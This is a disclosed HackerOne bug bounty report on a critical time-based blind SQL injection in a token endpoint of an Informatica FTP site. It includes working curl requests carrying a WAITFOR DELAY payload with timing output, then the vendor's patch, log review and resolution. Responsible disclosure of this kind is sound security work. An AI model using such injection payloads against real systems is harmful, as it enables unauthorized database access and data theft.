{"id":1034625,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDM0NjI1","url":"https://hackerone.com/reports/1034625","title":"Blind SQL injection at tsftp.informatica.com","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-11-14T17:39:02.503Z","submitted_at":"2020-11-14T17:39:02.567Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"r1pley","url":"/r1pley","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/FqW4AnqpJ156Nqw3phPcTG4x/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":453,"url":"https://hackerone.com/informatica","handle":"informatica","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Informatica","twitter_handle":"informatica","website":"https://www.informatica.com/","about":"Informatica Corporation is the worldâ€™s number one independent provider of data integration software."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-11-16T10:32:06.952Z","bug_reporter_agreed_on_going_public_at":"2020-11-15T17:58:39.882Z","team_member_agreed_on_going_public_at":"2020-11-16T10:32:06.844Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The parameter `refresh_token` sent to the REST path /api/v1/token is vulnerable to blind SQL injection.\n\nCompare the response time of these 2 requests:\n\n```\n$ time curl -X POST \"https://tsftp.informatica.com/api/v1/token\" -H \"accept: application/json\" -H \"Content-Type: application/x-www-form-urlencoded\" -d \"grant_type=refresh_token\u0026refresh_token='; WAITFOR DELAY '0:0:1'--\"\n{\"error\":\"invalid_grant\"}curl -X POST \"https://tsftp.informatica.com/api/v1/token\" -H  -H  -d   0.02s user 0.01s system 1% cpu 2.048 total\n```\n\nvs\n\n```\n$ time curl -X POST \"https://tsftp.informatica.com/api/v1/token\" -H \"accept: application/json\" -H \"Content-Type: application/x-www-form-urlencoded\" -d \"grant_type=refresh_token\u0026refresh_token='; WAITFOR DELAY '0:0:13'--\"\n{\"error\":\"invalid_grant\"}curl -X POST \"https://tsftp.informatica.com/api/v1/token\" -H  -H  -d   0.02s user 0.01s system 0% cpu 14.045 total\n```\nand notice that the WAITFOR DELAY command is executed.\n\n## Impact\n\nBlind SQL injection can be exploited to exfiltrate data from the FTP server, bypass authentication or for remote code execution.\n\nI stopped my testing at the time-based PoC because I didn't want to risk accessing sensitive data. If you would like to though, I can continue exploiting this vulnerability to present the above impact in practice, eg by getting the database version string.","vulnerability_information_html":"\u003cp\u003eThe parameter \u003ccode\u003erefresh_token\u003c/code\u003e sent to the REST path /api/v1/token is vulnerable to blind SQL injection.\u003c/p\u003e\n\n\u003cp\u003eCompare the response time of these 2 requests:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ time curl -X POST \u0026quot;https://tsftp.informatica.com/api/v1/token\u0026quot; -H \u0026quot;accept: application/json\u0026quot; -H \u0026quot;Content-Type: application/x-www-form-urlencoded\u0026quot; -d \u0026quot;grant_type=refresh_token\u0026amp;refresh_token=\u0026#39;; WAITFOR DELAY \u0026#39;0:0:1\u0026#39;--\u0026quot;\n{\u0026quot;error\u0026quot;:\u0026quot;invalid_grant\u0026quot;}curl -X POST \u0026quot;https://tsftp.informatica.com/api/v1/token\u0026quot; -H  -H  -d   0.02s user 0.01s system 1% cpu 2.048 total\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003evs\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ time curl -X POST \u0026quot;https://tsftp.informatica.com/api/v1/token\u0026quot; -H \u0026quot;accept: application/json\u0026quot; -H \u0026quot;Content-Type: application/x-www-form-urlencoded\u0026quot; -d \u0026quot;grant_type=refresh_token\u0026amp;refresh_token=\u0026#39;; WAITFOR DELAY \u0026#39;0:0:13\u0026#39;--\u0026quot;\n{\u0026quot;error\u0026quot;:\u0026quot;invalid_grant\u0026quot;}curl -X POST \u0026quot;https://tsftp.informatica.com/api/v1/token\u0026quot; -H  -H  -d   0.02s user 0.01s system 0% cpu 14.045 total\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand notice that the WAITFOR DELAY command is executed.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eBlind SQL injection can be exploited to exfiltrate data from the FTP server, bypass authentication or for remote code execution.\u003c/p\u003e\n\n\u003cp\u003eI stopped my testing at the time-based PoC because I didn\u0026#39;t want to risk accessing sensitive data. If you would like to though, I can continue exploiting this vulnerability to present the above impact in practice, eg by getting the database version string.\u003c/p\u003e\n","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-12-15T17:58:39.960Z","allow_singular_disclosure_after":-1160055.908060165,"singular_disclosure_allowed":true,"vote_count":66,"voters":["sw33tlie","mzfr","mashoud1122","kapkan","prophet","mygf","aporlorxl23","r1pley","mainteemoforfun","realtess","and 56 more..."],"severity":{"rating":"critical","score":9.8,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":9823754,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @r1pley  - thanks for your report. We are investigating and will be in touch. ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/r1pley\"\u003e@r1pley\u003c/a\u003e  - thanks for your report. We are investigating and will be in touch. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-14T17:45:21.944Z","updated_at":"2020-11-14T17:45:21.944Z","actor":{"username":"nheffernan","cleared":false,"url":"/nheffernan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9824226,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @r1pley  - thanks again for the report. We are continuing to investigate but have taken the service offline for maintenance as we assess the impact and perform upgrades. ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/r1pley\"\u003e@r1pley\u003c/a\u003e  - thanks again for the report. We are continuing to investigate but have taken the service offline for maintenance as we assess the impact and perform upgrades. \u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-14T20:56:23.500Z","updated_at":"2020-11-14T20:56:23.500Z","actor":{"username":"nheffernan","cleared":false,"url":"/nheffernan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9826471,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @r1pley - thanks again for your report. We've taken a number of actions on this;\n\nWe have fixed the affected feature and moved the site back to production and being accessible by removing the splash-page that we added and removing access restrictions. The underlying cause of the issue was a missing patch on the product used to provide the service. \n\nWe have also analysed both web server access logs and the database logs spanning back to before the vulnerability was publicly disclosed, allowing us to determine with a high degree of confidence that the issue was not exploited beyond initial PoC by anyone; however peer validation of this is ongoing. \n\nIn recognition to security researchers we look to add to our hall of fame - if this is something you are interested in please let us know your preferred name for this and we'll let you know once updated (typically one/quarter). ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/r1pley\"\u003e@r1pley\u003c/a\u003e - thanks again for your report. We\u0026#39;ve taken a number of actions on this;\u003c/p\u003e\n\n\u003cp\u003eWe have fixed the affected feature and moved the site back to production and being accessible by removing the splash-page that we added and removing access restrictions. The underlying cause of the issue was a missing patch on the product used to provide the service. \u003c/p\u003e\n\n\u003cp\u003eWe have also analysed both web server access logs and the database logs spanning back to before the vulnerability was publicly disclosed, allowing us to determine with a high degree of confidence that the issue was not exploited beyond initial PoC by anyone; however peer validation of this is ongoing. \u003c/p\u003e\n\n\u003cp\u003eIn recognition to security researchers we look to add to our hall of fame - if this is something you are interested in please let us know your preferred name for this and we\u0026#39;ll let you know once updated (typically one/quarter). \u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-15T12:40:31.849Z","updated_at":"2020-11-15T12:40:31.849Z","actor":{"username":"nheffernan","cleared":false,"url":"/nheffernan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"r1pley","url":"/r1pley"},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9827486,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi @nheffernan,\n\nImpressive response time! Yes, you can use @r1pley for the hall of fame. Can we also disclose the report?\n\nThanks,\n@r1pley ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/nheffernan\"\u003e@nheffernan\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eImpressive response time! Yes, you can use \u003ca href=\"/r1pley\"\u003e@r1pley\u003c/a\u003e for the hall of fame. Can we also disclose the report?\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\n\u003ca href=\"/r1pley\"\u003e@r1pley\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-15T17:58:39.896Z","updated_at":"2020-11-15T17:58:39.896Z","first_to_agree":true,"actor":{"username":"r1pley","cleared":false,"url":"/r1pley","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FqW4AnqpJ156Nqw3phPcTG4x/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9830662,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-16T10:32:06.876Z","updated_at":"2020-11-16T10:32:06.876Z","actor":{"username":"nheffernan","cleared":false,"url":"/nheffernan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9830663,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-16T10:32:06.975Z","updated_at":"2020-11-16T10:32:06.975Z","actor":{"username":"nheffernan","cleared":false,"url":"/nheffernan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":25452,"category":"team","content":"Researcher identified a time based/blind SQL injection in an Informatica TSFTP website and responsibly disclosed via this report. \n\nInformatica's incident response team engaged within minutes of the report being received, bringing the site offline for maintenance as the issue was resolved. Following resolution of the issue and confirmation from our security team the site was brought back online. Additionally web server access logs and database logs from before the issue existed were reviewed, showing the issue had not been exploited by any malicious attackers.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eResearcher identified a time based/blind SQL injection in an Informatica TSFTP website and responsibly disclosed via this report. \u003c/p\u003e\n\n\u003cp\u003eInformatica\u0026#39;s incident response team engaged within minutes of the report being received, bringing the site offline for maintenance as the issue was resolved. Following resolution of the issue and confirmation from our security team the site was brought back online. Additionally web server access logs and database logs from before the issue existed were reviewed, showing the issue had not been exploited by any malicious attackers.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}